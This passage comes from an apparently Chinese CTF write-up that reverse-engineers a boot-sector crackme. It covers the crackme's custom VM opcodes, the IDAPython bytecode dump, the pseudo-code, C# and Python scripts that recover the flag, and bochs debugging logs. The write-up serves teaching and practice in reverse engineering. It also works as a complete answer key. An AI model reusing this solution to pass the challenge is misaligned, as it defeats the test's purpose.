style="text-align:center"><code>buf[a] = b</code></td></tr><tr><td style="text-align:center">0x22</td><td style="text-align:center"><code>buf[a] = buf[b]</code></td></tr><tr><td style="text-align:center">0x23</td><td style="text-align:center"><code>buf[a] = code[buf[b]]</code></td></tr><tr><td style="text-align:center">0x24</td><td style="text-align:center"><code>code[buf[a]] = buf[b]</code></td></tr><tr><td style="text-align:center">0x25</td><td style="text-align:center"><code>buf[a] += buf[b]</code></td></tr><tr><td style="text-align:center">0x26</td><td style="text-align:center"><code>buf[a] -= buf[b]</code></td></tr><tr><td style="text-align:center">0x27</td><td style="text-align:center"><code>buf[a] ^= buf[b]</code></td></tr><tr><td style="text-align:center">0x28</td><td style="text-align:center"><code>buf[a] &lt;&lt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x29</td><td style="text-align:center"><code>buf[a] &gt;&gt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2A</td><td style="text-align:center"><code>buf[a] &amp;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2B</td><td style="text-align:center"><code>pc = a</code></td></tr><tr><td style="text-align:center">0x2C</td><td style="text-align:center"><code>if(buf[b] == 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2D</td><td style="text-align:center"><code>if(buf[b] != 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2E</td><td style="text-align:center">终止 CPU 运行，即 hlt 指令</td></tr><tr><td style="text-align:center">0x2F</td><td style="text-align:center">输出 flag 正确提示</td></tr><tr><td style="text-align:center">0x30</td><td style="text-align:center">输出 flag 错误提示</td></tr></tbody></table><p>根据上面的分析，用 IDAPython 把虚拟机指令 dump 下来：</p><pre><code class="python">code = []for addr in range(0x0F48, 0x11E0, 12):    ins = Dword(addr)    op1 = Dword(addr + 4)    op2 = Dword(addr + 8)    code.append(ins)    code.append(op1)    code.append(op2)print code</code></pre><p>然后用脚本处理一下，得到伪代码：</p><pre><code class="python">buf[0] = 129buf[1] ^= buf[1]code[buf[1]] = buf[1] # 0buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;129&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;129&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;130&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;130&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;131&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;131&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;132&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;132&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;133&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;133&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;134&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;134&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;135&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;135&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;136&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;136&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[2] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;137&#39;)buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # (&#39;Write code, offset:&#39;, &#39;137&#39;)buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0:    pc = buf[2] # jmp 9buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;129&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;138&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126print &#39;wrong&#39;</code></pre><p>上面是在 <code>buf[3] != 0</code> 的时候，输出 wrong 的情况，如果在这个条件判断中都正确的话，会产生以下代码：</p><pre><code class="python">buf[0] = 129buf[1] = buf[0]buf[2] = 9buf[1] += buf[2]buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;129&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;138&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;130&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;139&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;131&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;140&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;132&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;141&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;133&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;142&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;134&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;143&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;135&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;144&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;136&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;145&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;137&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;146&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90print &#39;right&#39;</code></pre><p>人脑逆向机简化一波代码，就是一个 9 次的循环异或，并在最后进行比较：</p><pre><code class="python">i = 129while True:    code[i] = code[i] ^ (code[i] &lt;&lt; 8) ^ (code[i] &lt;&lt; 16) ^ (code[i] &lt;&lt; 24) ^ code[i - 1] ^ (code[i - 1] &lt;&lt; 8) ^ (code[i - 1] &lt;&lt; 16) ^ (code[i - 1] &lt;&lt; 24)    i += 1    if i - 138 == 0:        breakfor i in range(9):    if code[138 + i] - code[129 + i] != 0:        print &#39;wrong&#39;        exit()print &#39;right&#39;</code></pre><p>这里已知正确的数据在计算后的结果，可以通过爆破来得到（爆破范围比较大，Python 会消耗很多时间，这里用 C#）：</p><pre><code class="c#">using System;namespace Solve {    class Program {        public static byte[] intToBytes(uint value) {            byte[] res = new byte[4];            res[3] = (byte) ((value &gt;&gt; 24) &amp; 0xFF);            res[2] = (byte) ((value &gt;&gt; 16) &amp; 0xFF);            res[1] = (byte) ((value &gt;&gt; 8) &amp; 0xFF);            res[0] = (byte) (value &amp; 0xFF);            return res;        }        public static string asciiToString(byte[] array) {            return Convert.ToString(System.Text.Encoding.ASCII.GetString(array));        }        static void Main(string[] args) {            var data = new uint[] {                0x61646238, 0x36353465, 0x6361352d, 0x31312d38, 0x612d3965, 0x2d316331, 0x39653838, 0x30386566, 0x66616566, 0x57635565, 0x06530401, 0x1f494949, 0x5157071f, 0x575f4357, 0x57435e57, 0x4357020a, 0x575e035e, 0x0f590000, 0x6e6f7277, 0x20202067, 0x00202020, 0x72726f63, 0x20746365, 0x20202020, 0x6c660020, 0x69206761, 0x6c662073, 0x597b6761, 0x5072756f, 0x68637461, 0x2020207d, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0xffffff00, 0xffffffff            };            var ans = new uint[data.Length];            var patch = new byte[data.Length * 4];            for(uint i = 0; i &lt; 9; i++) {                uint t = 0;                for(uint j = 0; j &lt;= 0x7FFFFFFF; j++) {                    t = j ^ (j &lt;&lt; 8) ^ (j &lt;&lt; 16) ^ (j &lt;&lt; 24);                    if(i &gt; 0) {                        t ^= ans[i - 1] ^ (ans[i - 1] &lt;&lt; 8) ^ (ans[i - 1] &lt;&lt; 16) ^ (ans[i - 1] &lt;&lt; 24);                    }                    if(t == data[i + 9]) { // 0x57635565                        ans[i] = j;                        patch[4 * i] = intToBytes(j)[0];                        patch[4 * i + 1] = intToBytes(j)[1];                        patch[4 * i + 2] = intToBytes(j)[2];                        patch[4 * i + 3] = intToBytes(j)[3];                        Console.WriteLine(&quot;0x{0:X8}&quot;, j);                        break;                    }                }            }            string flag = asciiToString(patch);            Console.WriteLine(flag);        }    }}</code></pre><p>当然在已知数据的情况下也可以直接逆回来：</p><pre><code class="python">#!/usr/bin/env pythondata = [0x57635565, 0x06530401, 0x1F494949, 0x5157071F, 0x575F4357, 0x57435E57, 0x4357020A, 0x575E035E, 0x0F590000, 0x00000000]flag = &#39;&#39;for i in range(9):    flag += libnum.n2s(data[i] ^ ((data[i] &lt;&lt; 8) &amp; 0xFFFFFFFF))[::-1]    data[i + 1] = data[i] ^ data[i + 1]print flag</code></pre><h1 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h1><p>这道题其实主要通过 bochs 进行动态调试来分析，下面附上动态调试的一些过程：</p><pre><code>&lt;bochs:1&gt; b 0x7c00&lt;bochs:2&gt; c00000004662i[BIOS  ] $Revision: 13073 $ $Date: 2017-02-16 22:43:52 +0100 (Do, 16. Feb 2017) $00000318050i[KBD   ] reset-disable command received00000320819i[BIOS  ] Starting rombios3200000321257i[BIOS  ] Shutdown flag 000000321840i[BIOS  ] ram_size=0x0200000000000322261i[BIOS  ] ram_end=32MB00000362829i[BIOS  ] Found 1 cpu(s)00000376413i[BIOS  ] bios_table_addr: 0x000f9cd8 end=0x000fcc0000000704208i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)00001032137i[P2ISA ] PCI IRQ routing: PIRQA# set to 0x0b00001032156i[P2ISA ] PCI IRQ routing: PIRQB# set to 0x0900001032175i[P2ISA ] PCI IRQ routing: PIRQC# set to 0x0b00001032194i[P2ISA ] PCI IRQ routing: PIRQD# set to 0x0900001032204i[P2ISA ] write: ELCR2 = 0x0a00001032974i[BIOS  ] PIIX3/PIIX4 init: elcr=00 0a00001040697i[BIOS  ] PCI: bus=0 devfn=0x00: vendor_id=0x8086 device_id=0x1237 class=0x060000001042976i[BIOS  ] PCI: bus=0 devfn=0x08: vendor_id=0x8086 device_id=0x7000 class=0x060100001045094i[BIOS  ] PCI: bus=0 devfn=0x09: vendor_id=0x8086 device_id=0x7010 class=0x010100001045323i[PIDE  ] new BM-DMA address: 0xc00000001045939i[BIOS  ] region 4: 0x0000c00000001047953i[BIOS  ] PCI: bus=0 devfn=0x0a: vendor_id=0x8086 device_id=0x7020 class=0x0c0300001048157i[UHCI  ] new base address: 0xc02000001048773i[BIOS  ] region 4: 0x0000c02000001048901i[UHCI  ] new irq line = 900001050796i[BIOS  ] PCI: bus=0 devfn=0x0b: vendor_id=0x8086 device_id=0x7113 class=0x068000001051028i[ACPI  ] new irq line = 1100001051040i[ACPI  ] new irq line = 900001051065i[ACPI  ] new PM base address: 0xb00000001051079i[ACPI  ] new SM base address: 0xb10000001051107i[PCI   ] setting SMRAM control register to 0x4a00001215200i[CPU0  ] Enter to System Management Mode00001215200i[CPU0  ] enter_system_management_mode: temporary disable VMX while in SMM mode00001215210i[CPU0  ] RSM: Resuming from System Management Mode00001379231i[PCI   ] setting SMRAM control register to 0x0a00001394138i[BIOS  ] MP table addr=0x000f9db0 MPC table addr=0x000f9ce0 size=0xc800001395960i[BIOS  ] SMBIOS table addr=0x000f9dc000001398141i[BIOS  ] ACPI tables: RSDP addr=0x000f9ee0 ACPI DATA addr=0x01ff0000 size=0xf7200001401353i[BIOS  ] Firmware waking vector 0x1ff00cc00001403148i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)00001403871i[BIOS  ] bios_table_cur_addr: 0x000f9f0400001531488i[VBIOS ] VGABios $Id: vgabios.c,v 1.76 2013/02/10 08:07:03 vruppert Exp $00001531559i[BXVGA ] VBE known Display Interface b0c000001531591i[BXVGA ] VBE known Display Interface b0c500001534516i[VBIOS ] VBE Bios $Id: vbe.c,v 1.65 2014/07/08 18:02:25 vruppert Exp $00014040189i[BIOS  ] Booting from 0000:7c00(0) Breakpoint 1, 0x0000000000007c00 in ?? ()Next at t=14040244(0) [0x000000007c00] 0000:7c00 (unk. ctxt): jmpf 0x07c0:0005          ; ea0500c007</code></pre><p>可以用 <code>show mode</code> 命令来显示实模式向保护模式的转换：</p><pre><code>&lt;bochs:3&gt; show modeshow mode switch: ONshow mask is: mode</code></pre><p>利用 <code>u</code> 命令来查看汇编代码，这里是实模式的部分：</p><pre><code>&lt;bochs:7&gt; u/40 0x7c0000007c00: (                    ): jmpf 0x07c0:0005          ; ea0500c00700007c05: (                    ): mov ax, cs                ; 8cc800007c07: (                    ): mov ds, ax                ; 8ed800007c09: (                    ): mov ss, ax                ; 8ed000007c0b: (                    ): mov sp, 0x0400            ; bc000400007c0e: (                    ): cld                       ; fc00007c0f: (                    ): mov ax, 0x0003            ; b8030000007c12: (                    ): int 0x10                  ; cd1000007c14: (                    ): mov dx, 0x0000            ; ba000000007c17: (                    ): mov cx, 0x0002            ; b9020000007c1a: (                    ): mov ax, 0x1000            ; b8001000007c1d: (                    ): mov es, ax                ; 8ec000007c1f: (                    ): xor bx, bx                ; 31db00007c21: (                    ): mov ax, 0x0228            ; b8280200007c24: (                    ): int 0x13                  ; cd1300007c26: (                    ): jnb .+2                   ; 730200007c28: (                    ): jmp .-2                   ; ebfe00007c2a: (                    ): cli                       ; fa00007c2b: (                    ): mov ax, 0x1000            ; b8001000007c2e: (                    ): mov ds, ax                ; 8ed800007c30: (                    ): xor ax, ax                ; 31c000007c32: (                    ): mov es, ax                ; 8ec000007c34: (                    ): mov cx, 0x2000            ; b9002000007c37: (                    ): sub si, si                ; 29f600007c39: (                    ): sub di, di                ; 29ff00007c3b: (                    ): rep movsb byte ptr es:[di], byte ptr ds:[si] ; f3a400007c3d: (                    ): mov ax, 0x07c0            ; b8c00700007c40: (                    ): mov ds, ax                ; 8ed800007c42: (                    ): lidt ds:0x006f            ; 0f011e6f0000007c47: (                    ): lgdt ds:0x0075            ; 0f0116750000007c4c: (                    ): mov ax, 0x0001            ; b8010000007c4f: (                    ): lmsw ax                   ; 0f01f000007c52: (                    ): jmpf 0x0008:0000          ; ea00000800</code></pre><p>在指令 <code>lmsw ax</code> 处看到实模式向保护模式的转换：</p><pre><code>&lt;bochs:39&gt; nNext at t=15885325(0) [0x000000007c4f] 07c0:004f (unk. ctxt): lmsw ax                   ; 0f01f0&lt;bochs:40&gt;00015885326: switched from &#39;real mode&#39; to &#39;protected mode&#39;Next at t=15885326(0) [0x000000007c52] 07c0:0000000000000052 (unk. ctxt): jmpf 0x0008:0000          ; ea00000800</code></pre><p>保护模式的前一段部分：</p><pre><code>&lt;bochs:42&gt; u/20 0x0000000000: (                    ): mov eax, 0x00000010       ; b81000000000000005: (                    ): mov ds, ax                ; 8ed800000007: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b00000000000e: (                    ): call .+120                ; e87800000000000013: (                    ): call .+107                ; e86b00000000000018: (                    ): mov eax, 0x00000010       ; b8100000000000001d: (                    ): mov ds, ax                ; 8ed80000001f: (                    ): mov es, ax                ; 8ec000000021: (                    ): mov fs, ax                ; 8ee000000023: (                    ): mov gs, ax                ; 8ee800000025: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b00000000002c: (                    ): xor ebx, ebx              ; 31db</code></pre><p>IDTR 的初始化：</p><pre><code>&lt;bochs:39&gt; u/20 0x8b0000008b: (                    ): mov edx, 0x000000fc       ; bafc00000000000090: (                    ): mov eax, 0x00080000       ; b80000080000000095: (                    ): mov ax, dx                ; 6689d000000098: (                    ): mov dx, 0x8e00            ; 66ba008e0000009c: (                    ): lea edi, dword ptr ds:0x00000128 ; 8d3d28010000000000a2: (                    ): mov ecx, 0x00000100       ; b900010000000000a7: (                    ): mov dword ptr ds:[edi], eax ; 8907000000a9: (                    ): mov dword ptr ds:[edi+4], edx ; 895704000000ac: (                    ): add edi, 0x00000008       ; 83c708000000af: (                    ): dec ecx                   ; 49000000b0: (                    ): jnz .-11                  ; 75f5000000b2: (                    ): lidt ds:0x0000011c        ; 0f011d1c010000000000b9: (                    ): ret                       ; c3</code></pre><p>GDTR 的初始化：</p><pre><code>&lt;bochs:68&gt; u/10 0x8300000083: (                    ): lgdt ds:0x00000122        ; 0f0115220100000000008a: (                    ): ret                       ; c3</code></pre><p>用 <code>sreg</code> 命令可以看到 GDTR 和 IDTR 寄存器被初始化了：</p><pre><code>&lt;bochs:75&gt; sreges:0x0000, dh=0x00009300, dl=0x0000ffff, valid=7    Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedcs:0x0008, dh=0x00c09b00, dl=0x000007ff, valid=1    Code segment, base=0x00000000, limit=0x007fffff, Execute/Read, Non-Conforming, Accessed, 32-bitss:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7    Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedds:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7    Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedfs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1    Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedgs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1    Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedldtr:0x0000, dh=0x00008200, dl=0x0000ffff, valid=1tr:0x0000, dh=0x00008b00, dl=0x0000ffff, valid=1gdtr:base=0x0000000000000928, limit=0x1fidtr:base=0x0000000000000128, limit=0x7ff</code></pre><p>最后是虚拟机指令部分：</p><pre><code>&lt;bochs:43&gt; u/110 0xb7c00000b7c: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b83: (                    ): mov dword ptr ds:[ecx], eax ; 890100000b85: (                    ): jmp .+366                 ; e96e01000000000b8a: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000b91: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000b93: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b9a: (                    ): mov dword ptr ds:[ecx], eax ; 890100000b9c: (                    ): jmp .+343                 ; e95701000000000ba1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000ba8: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000baa: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bb1: (                    ): lea eax, dword ptr ds:[eax*4+3400] ; 8d0485480d000000000bb8: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000bba: (                    ): mov dword ptr ds:[ecx], eax ; 890100000bbc: (                    ): jmp .+311                 ; e93701000000000bc1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000bc8: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000bca: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bd1: (                    ): mov ecx, dword ptr ds:[ecx] ; 8b0900000bd3: (                    ): lea ecx, dword ptr ds:[ecx*4+3400] ; 8d0c8d480d000000000bda: (                    ): mov dword ptr ds:[ecx], eax ; 890100000bdc: (                    ): jmp .+279                 ; e91701000000000be1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000be8: (                    ): mov edx, dword ptr ds:[eax] ; 8b1000000bea: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bf1: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000bf3: (                    ): add eax, edx              ; 01d000000bf5: (                    ): mov dword ptr ds:[ecx], eax ; 890100000bf7: (                    ): jmp .+252                 ; e9fc00000000000bfc: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c03: (                    ): mov edx, dword ptr ds:[eax] ; 8b1000000c05: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c0c: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000c0e: (                    ): sub eax, edx              ; 29d000000c10: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c12: (                    ): jmp .+225                 ; e9e100000000000c17: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c1e: (                    ): mov edx, dword ptr ds:[eax] ; 8b1000000c20: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c27: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000c29: (                    ): xor eax, edx              ; 31d000000c2b: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c2d: (                    ): jmp .+198                 ; e9c600000000000c32: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c39: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c3b: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c42: (                    ): mov cl, al                ; 88c100000c44: (                    ): mov eax, dword ptr ds:[edx] ; 8b0200000c46: (                    ): shl eax, cl               ; d3e000000c48: (                    ): mov dword ptr ds:[edx], eax ; 890200000c4a: (                    ): jmp .+169                 ; e9a900000000000c4f: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c56: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c58: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c5f: (                    ): mov cl, al                ; 88c100000c61: (                    ): mov eax, dword ptr ds:[edx] ; 8b0200000c63: (                    ): shr eax, cl               ; d3e800000c65: (                    ): mov dword ptr ds:[edx], eax ; 890200000c67: (                    ): jmp .+140                 ; e98c00000000000c6c: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c73: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c75: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c7c: (                    ): mov edx, dword ptr ds:[ecx] ; 8b1100000c7e: (                    ): and eax, edx              ; 21d000000c80: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c82: (                    